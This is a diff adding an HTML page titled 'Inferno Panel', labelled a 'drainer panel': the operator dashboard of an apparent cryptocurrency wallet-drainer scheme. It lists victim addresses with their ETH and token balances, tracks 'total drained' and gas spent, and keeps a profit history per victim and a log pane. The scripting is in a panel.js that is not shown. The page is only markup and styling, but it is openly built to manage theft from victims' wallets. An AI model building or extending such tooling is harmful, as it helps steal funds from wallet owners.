@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Inferno Panel</title>
+<style>
+  :root { --bg:#0a0a0f; --card:#12121a; --border:#1f1f2e; --red:#ff3b3b; --green:#2eff8b; --text:#e8e8f0; --dim:#7a7a8e; }
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body { background:var(--bg); color:var(--text); font-family:'SF Mono',Consolas,monospace; min-height:100vh; }
+  .wrap { max-width:1100px; margin:0 auto; padding:24px; }
+  h1 { font-size:20px; letter-spacing:2px; color:var(--red); margin-bottom:20px; }
+  h1 span { color:var(--text); }
+  .grid { display:grid; grid-template-columns:1fr 1fr; gap:16px; margin-bottom:16px; }
+  .card { background:var(--card); border:1px solid var(--border); border-radius:8px; padding:16px; }
+  .card h2 { font-size:12px; text-transform:uppercase; letter-spacing:1px; color:var(--dim); margin-bottom:12px; }
+  input, select { width:100%; background:#0d0d14; border:1px solid var(--border); color:var(--text); padding:8px 10px; border-radius:6px; font-family:inherit; font-size:13px; margin-bottom:8px; }
+  button { background:var(--red); color:#fff; border:none; padding:8px 14px; border-radius:6px; cursor:pointer; font-family:inherit; font-size:13px; font-weight:600; }
+  button.ghost { background:transparent; border:1px solid var(--border); color:var(--dim); }
+  button.green { background:var(--green); color:#000; }
+  table { width:100%; border-collapse:collapse; font-size:12px; }
+  th { text-align:left; color:var(--dim); font-weight:400; padding:6px 8px; border-bottom:1px solid var(--border); }
+  td { padding:6px 8px; border-bottom:1px solid #16161f; }
+  .tag { display:inline-block; padding:2px 8px; border-radius:4px; font-size:11px; }
+  .tag.ok { background:rgba(46,255,139,.12); color:var(--green); }
+  .tag.warn { background:rgba(255,59,59,.12); color:var(--red); }
+  .row { display:flex; gap:8px; align-items:center; }
+  .log { max-height:220px; overflow-y:auto; font-size:11px; line-height:1.7; }
+  .log .t { color:var(--dim); }
+  .log .drain { color:var(--green); }
+  .log .err { color:var(--red); }
+  .stat { font-size:26px; font-weight:700; }
+  .stat small { font-size:11px; color:var(--dim); display:block; font-weight:400; }
+  .flex { display:flex; justify-content:space-between; align-items:center; }
+  @media(max-width:760px){ .grid{grid-template-columns:1fr;} }
+</style>
+</head>
+<body>
+<div class="wrap">
+  <h1>INFERNO <span>// drainer panel</span></h1>
+
+  <div class="grid">
+    <div class="card">
+      <h2>Contract</h2>
+      <input id="drainer" placeholder="0x... drainer address">
+      <div class="row">
+        <button class="green" onclick="saveSettings()">Save</button>
+        <button class="ghost" onclick="loadState()">Reload</button>
+      </div>
+    </div>
+    <div class="card">
+      <h2>Stats</h2>
+      <div class="flex">
+        <div class="stat" id="statProfit">0<small>total drained (tokens)</small></div>
+        <div class="stat" id="statGas">0<small>gas spent (ETH)</small></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="card" style="margin-bottom:16px">
+    <h2>Victims</h2>
+    <div class="row" style="margin-bottom:12px">
+      <input id="victimAddr" placeholder="0x... victim address" style="flex:1">
+      <button onclick="addVictim()">Add</button>
+    </div>
+    <table>
+      <thead><tr><th>Address</th><th>ETH</th><th>Tokens</th><th></th></tr></thead>
+      <tbody id="victimRows"></tbody>
+    </table>
+  </div>
+
+  <div class="card" style="margin-bottom:16px">
+    <h2>Profit history</h2>
+    <table>
+      <thead><tr><th>Time</th><th>Victim</th><th>Result</th><th>Gas</th></tr></thead>
+      <tbody id="profitRows"></tbody>
+    </table>
+  </div>
+
+  <div class="card">
+    <h2>Logs</h2>
+    <div class="log" id="logBox"></div>
+  </div>
+</div>
+<script src="panel.js"></script>
+</body>
+</html>
